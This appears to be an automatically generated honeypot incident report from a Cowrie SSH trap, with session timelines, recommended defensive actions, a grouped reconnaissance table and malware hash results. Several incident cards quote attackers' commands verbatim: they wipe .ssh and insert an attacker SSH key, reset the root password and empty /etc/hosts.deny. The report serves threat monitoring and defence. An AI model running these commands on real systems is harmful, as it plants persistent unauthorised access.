| `2026-06-09 14:48:19` | `cowrie.log.closed` |
| `2026-06-09 14:48:19` | `cowrie.session.params` |
| `2026-06-09 14:48:19` | `cowrie.command.input` |
| `2026-06-09 14:48:19` | `cowrie.log.closed` |
| `2026-06-09 14:48:19` | `cowrie.session.params` |
| `2026-06-09 14:48:19` | `cowrie.command.input` |
| `2026-06-09 14:48:19` | `cowrie.log.closed` |
| `2026-06-09 14:48:20` | `cowrie.session.params` |
| `2026-06-09 14:48:20` | `cowrie.command.input` |
| `2026-06-09 14:48:20` | `cowrie.log.closed` |
| `2026-06-09 14:48:20` | `cowrie.session.params` |
| `2026-06-09 14:48:20` | `cowrie.command.input` |
| `2026-06-09 14:48:20` | `cowrie.log.closed` |
| `2026-06-09 14:48:20` | `cowrie.session.params` |
| `2026-06-09 14:48:20` | `cowrie.command.input` |
| `2026-06-09 14:48:21` | `cowrie.log.closed` |
| `2026-06-09 14:48:21` | `cowrie.session.params` |
| `2026-06-09 14:48:21` | `cowrie.command.input` |
| `2026-06-09 14:48:21` | `cowrie.log.closed` |
| `2026-06-09 14:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.119[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.196.119[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eacd589a76ee

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:50 |
| **Last Seen** | 2026-06-09 14:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:50:28` | `cowrie.session.connect` |
| `2026-06-09 14:50:28` | `cowrie.client.version` |
| `2026-06-09 14:50:28` | `cowrie.client.kex` |
| `2026-06-09 14:50:28` | `cowrie.login.success` |
| `2026-06-09 14:50:28` | `cowrie.session.params` |
| `2026-06-09 14:50:28` | `cowrie.command.input` |
| `2026-06-09 14:50:28` | `cowrie.command.failed` |
| `2026-06-09 14:50:29` | `cowrie.log.closed` |
| `2026-06-09 14:50:29` | `cowrie.session.params` |
| `2026-06-09 14:50:29` | `cowrie.command.input` |
| `2026-06-09 14:50:29` | `cowrie.session.file_download` |
| `2026-06-09 14:50:29` | `cowrie.log.closed` |
| `2026-06-09 14:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd30d50c384

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:50 |
| **Last Seen** | 2026-06-09 14:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:50:31` | `cowrie.session.connect` |
| `2026-06-09 14:50:31` | `cowrie.client.version` |
| `2026-06-09 14:50:31` | `cowrie.client.kex` |
| `2026-06-09 14:50:31` | `cowrie.login.success` |
| `2026-06-09 14:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa4eac968105

| Field | Detail |
|---|---|
| **Source IP** | `118.196.119[.]108` |
| **First Seen** | 2026-06-09 14:55 |
| **Last Seen** | 2026-06-09 14:55 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:LvShEQJHfEPv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:55:19` | `cowrie.session.connect` |
| `2026-06-09 14:55:20` | `cowrie.client.version` |
| `2026-06-09 14:55:20` | `cowrie.client.kex` |
| `2026-06-09 14:55:21` | `cowrie.login.success` |
| `2026-06-09 14:55:21` | `cowrie.session.params` |
| `2026-06-09 14:55:21` | `cowrie.command.input` |
| `2026-06-09 14:55:21` | `cowrie.command.failed` |
| `2026-06-09 14:55:21` | `cowrie.log.closed` |
| `2026-06-09 14:55:21` | `cowrie.session.params` |
| `2026-06-09 14:55:21` | `cowrie.command.input` |
| `2026-06-09 14:55:21` | `cowrie.session.file_download` |
| `2026-06-09 14:55:21` | `cowrie.log.closed` |
| `2026-06-09 14:55:38` | `cowrie.session.params` |
| `2026-06-09 14:55:38` | `cowrie.command.input` |
| `2026-06-09 14:55:38` | `cowrie.log.closed` |
| `2026-06-09 14:55:38` | `cowrie.session.params` |
| `2026-06-09 14:55:38` | `cowrie.command.input` |
| `2026-06-09 14:55:38` | `cowrie.log.closed` |
| `2026-06-09 14:55:39` | `cowrie.session.params` |
| `2026-06-09 14:55:39` | `cowrie.command.input` |
| `2026-06-09 14:55:39` | `cowrie.session.file_download` |
| `2026-06-09 14:55:39` | `cowrie.log.closed` |
| `2026-06-09 14:55:39` | `cowrie.session.params` |
| `2026-06-09 14:55:39` | `cowrie.command.input` |
| `2026-06-09 14:55:39` | `cowrie.log.closed` |
| `2026-06-09 14:55:39` | `cowrie.session.params` |
| `2026-06-09 14:55:39` | `cowrie.command.input` |
| `2026-06-09 14:55:40` | `cowrie.log.closed` |
| `2026-06-09 14:55:40` | `cowrie.session.params` |
| `2026-06-09 14:55:40` | `cowrie.command.input` |
| `2026-06-09 14:55:40` | `cowrie.command.input` |
| `2026-06-09 14:55:40` | `cowrie.log.closed` |
| `2026-06-09 14:55:40` | `cowrie.session.params` |
| `2026-06-09 14:55:40` | `cowrie.command.input` |
| `2026-06-09 14:55:41` | `cowrie.log.closed` |
| `2026-06-09 14:55:41` | `cowrie.session.params` |
| `2026-06-09 14:55:41` | `cowrie.command.input` |
| `2026-06-09 14:55:41` | `cowrie.log.closed` |
| `2026-06-09 14:55:41` | `cowrie.session.params` |
| `2026-06-09 14:55:41` | `cowrie.command.input` |
| `2026-06-09 14:55:42` | `cowrie.log.closed` |
| `2026-06-09 14:55:42` | `cowrie.session.params` |
| `2026-06-09 14:55:42` | `cowrie.command.input` |
| `2026-06-09 14:55:42` | `cowrie.log.closed` |
| `2026-06-09 14:55:42` | `cowrie.session.params` |
| `2026-06-09 14:55:42` | `cowrie.command.input` |
| `2026-06-09 14:55:42` | `cowrie.log.closed` |
| `2026-06-09 14:55:43` | `cowrie.session.params` |
| `2026-06-09 14:55:43` | `cowrie.command.input` |
| `2026-06-09 14:55:43` | `cowrie.log.closed` |
| `2026-06-09 14:55:43` | `cowrie.session.params` |
| `2026-06-09 14:55:43` | `cowrie.command.input` |
| `2026-06-09 14:55:43` | `cowrie.log.closed` |
| `2026-06-09 14:55:44` | `cowrie.session.params` |
| `2026-06-09 14:55:44` | `cowrie.command.input` |
| `2026-06-09 14:55:44` | `cowrie.log.closed` |
| `2026-06-09 14:55:44` | `cowrie.session.params` |
| `2026-06-09 14:55:44` | `cowrie.command.input` |
| `2026-06-09 14:55:44` | `cowrie.log.closed` |
| `2026-06-09 14:55:44` | `cowrie.session.params` |
| `2026-06-09 14:55:44` | `cowrie.command.input` |
| `2026-06-09 14:55:45` | `cowrie.log.closed` |
| `2026-06-09 14:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.119[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.196.119[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1968dc2e7e57

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:55 |
| **Last Seen** | 2026-06-09 14:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:55:53` | `cowrie.session.connect` |
| `2026-06-09 14:55:53` | `cowrie.client.version` |
| `2026-06-09 14:55:53` | `cowrie.client.kex` |
| `2026-06-09 14:55:54` | `cowrie.login.success` |
| `2026-06-09 14:55:54` | `cowrie.session.params` |
| `2026-06-09 14:55:54` | `cowrie.command.input` |
| `2026-06-09 14:55:54` | `cowrie.command.failed` |
| `2026-06-09 14:55:54` | `cowrie.log.closed` |
| `2026-06-09 14:55:54` | `cowrie.session.params` |
| `2026-06-09 14:55:54` | `cowrie.command.input` |
| `2026-06-09 14:55:55` | `cowrie.session.file_download` |
| `2026-06-09 14:55:55` | `cowrie.log.closed` |
| `2026-06-09 14:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e669b8531eca

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:55 |
| **Last Seen** | 2026-06-09 14:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:55:56` | `cowrie.session.connect` |
| `2026-06-09 14:55:56` | `cowrie.client.version` |
| `2026-06-09 14:55:57` | `cowrie.client.kex` |
| `2026-06-09 14:55:57` | `cowrie.login.success` |
| `2026-06-09 14:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fd6b206b669

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:57 |
| **Last Seen** | 2026-06-09 14:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:57:52` | `cowrie.session.connect` |
| `2026-06-09 14:57:52` | `cowrie.client.version` |
| `2026-06-09 14:57:52` | `cowrie.client.kex` |
| `2026-06-09 14:57:52` | `cowrie.login.success` |
| `2026-06-09 14:57:52` | `cowrie.session.params` |
| `2026-06-09 14:57:52` | `cowrie.command.input` |
| `2026-06-09 14:57:52` | `cowrie.command.failed` |
| `2026-06-09 14:57:53` | `cowrie.log.closed` |
| `2026-06-09 14:57:53` | `cowrie.session.params` |
| `2026-06-09 14:57:53` | `cowrie.command.input` |
| `2026-06-09 14:57:53` | `cowrie.session.file_download` |
| `2026-06-09 14:57:53` | `cowrie.log.closed` |
| `2026-06-09 14:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eaa6c04cdb4

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 14:57 |
| **Last Seen** | 2026-06-09 14:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 14:57:55` | `cowrie.session.connect` |
| `2026-06-09 14:57:55` | `cowrie.client.version` |
| `2026-06-09 14:57:55` | `cowrie.client.kex` |
| `2026-06-09 14:57:55` | `cowrie.login.success` |
| `2026-06-09 14:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `128.199.25[.]179` | **611** | 2026-06-09 11:19 | 2026-06-09 14:58 | 397m | 0 | `T1592` | 🟠 MEDIUM |
| `143.110.178[.]27` | **207** | 2026-06-09 11:21 | 2026-06-09 14:57 | 171m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.128[.]218` | **58** | 2026-06-09 11:22 | 2026-06-09 13:52 | 30m | 0 | `T1592` | 🟠 MEDIUM |
| `49.64.242[.]249` | **32** | 2026-06-09 11:20 | 2026-06-09 11:51 | 58m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `116.233.39[.]105` | **31** | 2026-06-09 12:30 | 2026-06-09 12:48 | 48m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.143.10[.]140` | **30** | 2026-06-09 11:33 | 2026-06-09 12:28 | 1m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `135.13.28[.]35` | **30** | 2026-06-09 11:36 | 2026-06-09 12:43 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.96.157[.]188` | **28** | 2026-06-09 14:07 | 2026-06-09 14:23 | 45m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.26.36[.]195` | **19** | 2026-06-09 14:15 | 2026-06-09 14:57 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.74.68[.]248` | **19** | 2026-06-09 11:41 | 2026-06-09 13:42 | 3m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `46.24.47[.]94` | **19** | 2026-06-09 11:26 | 2026-06-09 12:03 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.92[.]70` | **17** | 2026-06-09 14:22 | 2026-06-09 14:54 | 26m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.196.119[.]108` | **16** | 2026-06-09 14:14 | 2026-06-09 14:56 | 26m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.246.15[.]94` | **16** | 2026-06-09 13:40 | 2026-06-09 14:33 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.87.99[.]202` | **16** | 2026-06-09 14:18 | 2026-06-09 14:38 | 26m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.13.206[.]100` | **13** | 2026-06-09 11:19 | 2026-06-09 11:52 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.111[.]155` | **7** | 2026-06-09 12:02 | 2026-06-09 13:46 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.196[.]101` | **7** | 2026-06-09 12:18 | 2026-06-09 12:44 | 12m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.145.143[.]163` | **3** | 2026-06-09 14:12 | 2026-06-09 14:17 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]206` | **3** | 2026-06-09 12:47 | 2026-06-09 12:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `135.237.125[.]132` | **2** | 2026-06-09 11:24 | 2026-06-09 11:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]96` | **2** | 2026-06-09 14:36 | 2026-06-09 14:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.15[.]225` | **2** | 2026-06-09 14:25 | 2026-06-09 14:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.19.217[.]134` | **2** | 2026-06-09 11:42 | 2026-06-09 11:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.47.155[.]9` | 1 | 2026-06-09 12:24 | 2026-06-09 12:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.52.114[.]250` | 1 | 2026-06-09 14:22 | 2026-06-09 14:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.75.224[.]96` | 1 | 2026-06-09 11:58 | 2026-06-09 11:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.32[.]53` | 1 | 2026-06-09 14:37 | 2026-06-09 14:37 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.192[.]112` | 1 | 2026-06-09 14:21 | 2026-06-09 14:21 | 1s | 0 | `T1592` | 🟢 LOW |
| `121.179.93[.]147` | 1 | 2026-06-09 13:58 | 2026-06-09 13:58 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.227.152[.]250` | 1 | 2026-06-09 14:19 | 2026-06-09 14:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `13.94.39[.]162` | 1 | 2026-06-09 11:38 | 2026-06-09 11:38 | 21s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]213` | 1 | 2026-06-09 11:36 | 2026-06-09 11:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]232` | 1 | 2026-06-09 13:05 | 2026-06-09 13:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.73[.]80` | 1 | 2026-06-09 13:03 | 2026-06-09 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.53.168[.]23` | 1 | 2026-06-09 11:30 | 2026-06-09 11:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.53.168[.]23` | 1 | 2026-06-09 14:06 | 2026-06-09 14:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `18.234.191[.]99` | 1 | 2026-06-09 13:11 | 2026-06-09 13:11 | 1s | 0 | `T1592` | 🟢 LOW |
| `186.103.136[.]43` | 1 | 2026-06-09 14:33 | 2026-06-09 14:33 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.116.34[.]103` | 1 | 2026-06-09 11:22 | 2026-06-09 11:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.145.0[.]61` | 1 | 2026-06-09 12:02 | 2026-06-09 12:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]28` | 1 | 2026-06-09 11:32 | 2026-06-09 11:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.180.171[.]157` | 1 | 2026-06-09 11:33 | 2026-06-09 11:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.162.135[.]224` | 1 | 2026-06-09 13:41 | 2026-06-09 13:41 | 12s | 0 | `T1592` | 🟢 LOW |
| `41.59.229[.]33` | 1 | 2026-06-09 13:42 | 2026-06-09 13:42 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-06-09 13:26 | 2026-06-09 13:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `8.219.115[.]249` | 1 | 2026-06-09 14:52 | 2026-06-09 14:52 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
